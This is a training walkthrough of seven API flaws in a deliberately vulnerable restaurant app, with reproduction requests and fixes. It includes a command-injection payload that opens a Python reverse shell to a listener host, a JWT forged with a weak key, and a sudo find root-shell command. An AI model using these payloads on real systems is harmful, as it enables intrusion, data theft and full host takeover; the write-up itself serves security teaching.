# Damn Vulnerable RESTourant — API Security Walkthrough

> **Disclaimer:** This walkthrough is intended for educational purposes only. All findings were discovered against a local, intentionally vulnerable application. Never test techniques against systems you do not own or have explicit permission to test.

---

## Table of Contents

1. [BOLA — Order View Functionality](#1-bola--order-view-functionality)
2. [Security Misconfiguration — Information Disclosure](#2-security-misconfiguration--information-disclosure)
3. [BFLA — Menu Deletion Functionality](#3-bfla--menu-deletion-functionality)
4. [Vertical Privilege Escalation — Weak JWT Signing Key](#4-vertical-privilege-escalation--weak-jwt-signing-key)
5. [RCE — Admin Disk Stats Endpoint](#5-rce--admin-disk-stats-endpoint)
6. [Privilege Escalation — Abused Sudo Permissions](#6-privilege-escalation--abused-sudo-permissions)
7. [Vertical Privilege Escalation — Mass Assignment (BOPLA)](#7-vertical-privilege-escalation--mass-assignment-bopla)

---

## 1. BOLA — Order View Functionality

| Field | Detail |
|---|---|
| **Vulnerability** | Broken Object Level Authorization (BOLA / IDOR) |
| **Endpoint** | `GET /orders/{id}` |
| **Severity** | High |

### Summary

The order view endpoint does not verify that the requesting user owns the order being fetched. By incrementing or enumerating the `id` parameter, any authenticated user can retrieve other users' orders — including their delivery address, phone number, and order contents.

### Steps to Reproduce

1. Register a new user account and authenticate to obtain a bearer token.
2. Place a new order and note the `id` value returned in the response.
3. Send a `GET /orders/{your-order-id}` request with your token.
4. Change the `id` value in the URL to a different integer (e.g., `3`).

**Request:**
```http
GET /orders/3 HTTP/1.1
Host: localhost:8091
Authorization: Bearer <your-token-here>
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "delivery_address": "1650 Central Ave SE, Albuquerque, NM 87106",
  "phone_number": "(505) 56434-7346",
  "id": 3,
  "user_id": 5,
  "items": [
    { "menu_item_id": 6, "quantity": 3 },
    { "menu_item_id": 8, "quantity": 1 }
  ],
  "status": "Delivered",
  "final_price": 14.76
}
```

The response belongs to a different user (user_id 5), exposing their PII and order history.

### Mitigation

On the server side, verify that `current_user.id == order.user_id` before returning the order. Return `403 Forbidden` if the check fails. Example:

```python
@router.get("/orders/{order_id}")
def get_order(order_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    order = db.query(Order).filter(Order.id == order_id).first()
    if not order or order.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Forbidden")
    return order
```

---

## 2. Security Misconfiguration — Information Disclosure

| Field | Detail |
|---|---|
| **Vulnerability** | Security Misconfiguration — Verbose Headers |
| **Endpoint** | `GET /healthcheck` |
| **Severity** | Low / Informational |

### Summary

The `/healthcheck` endpoint sets an `x-powered-by` response header that reveals the exact runtime and framework version in use (`Python 3.10, FastAPI ^0.103.0`). This allows an attacker to fingerprint the technology stack and target known CVEs for those specific versions.

### Steps to Reproduce

**Request:**
```http
GET /healthcheck HTTP/1.1
Host: localhost:8091
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json
x-powered-by: Python 3.10, FastAPI ^0.103.0

{"ok": true}
```

### Root Cause

The header is set explicitly in the route handler:

```python
# apis/healthcheck.py — VULNERABLE
@router.get("/healthcheck")
def healthcheck(response: Response):
    response.headers["X-Powered-By"] = "Python 3.10, FastAPI ^0.103.0"
    return {"ok": True}
```

### Mitigation

Remove the `X-Powered-By` header assignment entirely:

```python
# apis/healthcheck.py — FIXED
@router.get("/healthcheck")
def healthcheck():
    return {"ok": True}
```

> **Best Practice:** Also consider adding a global middleware to strip any `server` or `x-powered-by` headers automatically, so they cannot leak from other endpoints.

---

## 3. BFLA — Menu Deletion Functionality

| Field | Detail |
|---|---|
| **Vulnerability** | Broken Function Level Authorization (BFLA) |
| **Endpoint** | `DELETE /menu/{item_id}` |
| **Severity** | High |

### Summary

The menu deletion endpoint is accessible to any authenticated user, regardless of their role. A standard `customer` account can delete menu items — an action that should be restricted to `employee` or `chef` roles.

### Steps to Reproduce

1. Authenticate as any regular user and obtain a bearer token.
2. Send a `DELETE` request to `/menu/3`.

**Request:**
```http
DELETE /menu/3 HTTP/1.1
Host: localhost:8091
Authorization: Bearer <customer-token-here>
Accept: */*
```

**First response** — item deleted successfully:
```http
HTTP/1.1 204 No Content
```

**Second response** — confirms the item is gone:
```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{"detail": "Menu item not found"}
```

### Mitigation

Enforce Role-Based Access Control (RBAC) using a dependency:

```python
# apis/menu/router.py — FIXED
from apis.auth.utils import RolesBasedAuthChecker, get_current_user
from db.models import User, UserRole

@router.delete("/menu/{item_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_menu_item(
    item_id: int,
    current_user: Annotated[User, Depends(get_current_user)],
    db: Session = Depends(get_db),
    auth=Depends(RolesBasedAuthChecker([UserRole.EMPLOYEE, UserRole.CHEF])),
):
    utils.delete_menu_item(db, item_id)
```

The `RolesBasedAuthChecker` dependency ensures only users with the `EMPLOYEE` or `CHEF` role can call this endpoint.

---

## 4. Vertical Privilege Escalation — Weak JWT Signing Key

| Field | Detail |
|---|---|
| **Vulnerability** | Weak JWT Secret / Privilege Escalation |
| **Endpoint** | `POST /token`, `GET /profile` |
| **Severity** | Critical |

### Summary

The application signs JWT tokens with a weak, short numeric key (`147349`). An attacker who discovers or brute-forces this key can forge tokens with an arbitrary `sub` (subject) claim — effectively impersonating any user, including privileged accounts like `chef`.

### Steps to Reproduce

1. Register an account and call `POST /token` to obtain your JWT.

2. In Burp Suite's **JWT Editor** extension, create a new **Symmetric Key** and replace the `k` value with the following Base64-encoded string:

```
MTQ3MzQ5
```

The key JSON should look like this:

```json
{
  "kty": "oct",
  "kid": "601b59eb-940f-4ce2-8749-4add0e8921bc",
  "k": "MTQ3MzQ5"
}
```

3. Edit the JWT payload, changing `"sub"` to `"chef"`, then sign the token with the key above.

4. Use the forged token to access the `/profile` endpoint:

**Request:**
```http
GET /profile HTTP/1.1
Host: localhost:8091
Authorization: Bearer <forged-token-here>
Accept: application/json
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "chef",
  "phone_number": "(505) 146-0195",
  "first_name": "Gustavo",
  "last_name": "",
  "role": "Chef"
}
```

The forged token is accepted and grants Chef-level access.

> **Next Step:** This Chef token can then be used to access the `/admin/stats/disk` endpoint — see [Finding #5](#5-rce--admin-disk-stats-endpoint).

### Mitigation

- Use a cryptographically random secret of at least 256 bits (32 bytes) for HMAC-SHA256 signing.
- Consider rotating to an asymmetric signing algorithm (RS256 / ES256) where the private key never leaves the server.
- Example of generating a strong key: `python3 -c "import secrets; print(secrets.token_hex(32))"`

---

## 5. RCE — Admin Disk Stats Endpoint

| Field | Detail |
|---|---|
| **Vulnerability** | Remote Code Execution (Command Injection) |
| **Endpoint** | `GET /admin/stats/disk` |
| **Severity** | Critical |
| **Prerequisite** | Chef-level JWT (see [Finding #4](#4-vertical-privilege-escalation--weak-jwt-signing-key)) |

### Summary

The `/admin/stats/disk` endpoint accepts a `parameters` query string that is passed unsanitized to a shell command. By injecting shell metacharacters, an attacker with Chef-level access can execute arbitrary OS commands — including spawning a reverse shell.

### Steps to Reproduce

1. Use the forged Chef JWT from Finding #4.

2. Start a Netcat listener on your machine:

```bash
nc -lvnp 4444
```

3. Send the following request (URL-decoded payload shown for clarity):

**URL-decoded payload:**
```
&export RHOST="192.168.1.9";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

**Raw request:**
```http
GET /admin/stats/disk?parameters=%26export+RHOST%3d"192.168.1.9"%3bexport+RPORT%3d4444%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")' HTTP/1.1
Host: localhost:8091
Authorization: Bearer <chef-token-here>
Accept: application/json
```

A reverse shell connection is established on the listener.

### Mitigation

- Never pass user-controlled input directly into shell commands. Use Python's `subprocess` module with a list of arguments (no `shell=True`) and a strict allowlist of permitted parameters.
- Apply the principle of least privilege: the application process should not run as root.

---

## 6. Privilege Escalation — Abused Sudo Permissions

| Field | Detail |
|---|---|
| **Vulnerability** | Insecure Sudo Configuration (GTFOBins) |
| **Context** | Post-exploitation / local privilege escalation |
| **Severity** | Critical |
| **Prerequisite** | Shell access on the host (e.g., from Finding #5) |

### Summary

The `app` OS user is configured to run `/usr/bin/find` as root without a password. The `find` binary can execute arbitrary commands via its `-exec` flag, allowing full privilege escalation to root.

### Steps to Reproduce

1. From your shell, check sudo permissions:

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for app on a01ec42a7e2d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User app may run the following commands on a01ec42a7e2d:
    (ALL) NOPASSWD: /usr/bin/find
```

2. Exploit the `find` binary to spawn a root shell:

```bash
sudo find . -exec /bin/sh \; -quit
```

You now have a root shell.

### Mitigation

- Remove the `/usr/bin/find` sudo rule entirely. Grant the application only the minimum OS privileges it actually requires.
- Audit all `NOPASSWD` sudo entries. Refer to [GTFOBins](https://gtfobins.github.io/) to understand which binaries are dangerous when granted sudo access.
- Consider running the application inside a container with a read-only root filesystem and a non-root user.

---

## 7. Vertical Privilege Escalation — Mass Assignment (BOPLA)

| Field | Detail |
|---|---|
| **Vulnerability** | Broken Object Property Level Authorization (BOPLA) / Mass Assignment |
| **Endpoint** | `PATCH /profile` |
| **Severity** | High |

### Summary

The profile update endpoint uses a Pydantic model configured with `extra=Extra.allow`, which causes FastAPI to accept and bind any JSON field — including `role` — directly onto the user database object. An authenticated user can therefore promote themselves to any role (e.g., `Chef`) with a single request.

### Steps to Reproduce

1. Authenticate and obtain your bearer token.
2. Send the following request, adding a `"role"` field to the JSON body:

**Request:**
```http
PATCH /profile HTTP/1.1
Host: localhost:8091
Authorization: Bearer <your-token-here>
Content-Type: application/json

{
  "first_name": "wiener",
  "last_name": "peter",
  "phone_number": "123456789",
  "role": "Chef"
}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "username": "wiener",
  "phone_number": "123456789",
  "first_name": "wiener",
  "last_name": "peter",
  "role": "Chef"
}
```

The `role` field was accepted and the account is now elevated to Chef.

### Root Cause

```python
# VULNERABLE — extra=Extra.allow accepts any field including "role"
class UserUpdate(BaseModel, extra=Extra.allow):
    first_name: Union[str, None] = None
    last_name: Union[str, None] = None
    phone_number: Union[str, None] = None
```

The `for var, value in user.dict().items()` loop then blindly sets every received field on the DB model, including `role`.

### Mitigation

Remove `extra=Extra.allow` so that undeclared fields are silently ignored:

```python
# FIXED — only explicitly declared fields are accepted
class UserUpdate(BaseModel):
    first_name: Union[str, None] = None
    last_name: Union[str, None] = None
    phone_number: Union[str, None] = None
```

> **Best Practice:** Even with this fix, use an explicit allowlist in the update loop rather than iterating all fields. Never call `setattr` on model attributes you haven't explicitly permitted.

---

## Summary Table

| # | Vulnerability | Endpoint | Severity | OWASP API Top 10 |
|---|---|---|---|---|
| 1 | BOLA (IDOR) | `GET /orders/{id}` | High | API1:2023 |
| 2 | Information Disclosure | `GET /healthcheck` | Low | API8:2023 |
| 3 | BFLA | `DELETE /menu/{id}` | High | API5:2023 |
| 4 | Weak JWT Secret | `POST /token` | Critical | API2:2023 |
| 5 | Remote Code Execution | `GET /admin/stats/disk` | Critical | API8:2023 |
| 6 | Sudo Misconfiguration | Host OS | Critical | API8:2023 |
| 7 | Mass Assignment (BOPLA) | `PATCH /profile` | High | API3:2023 |

---

*Generated against Damn Vulnerable RESTourant — a deliberately insecure API for security training purposes.*
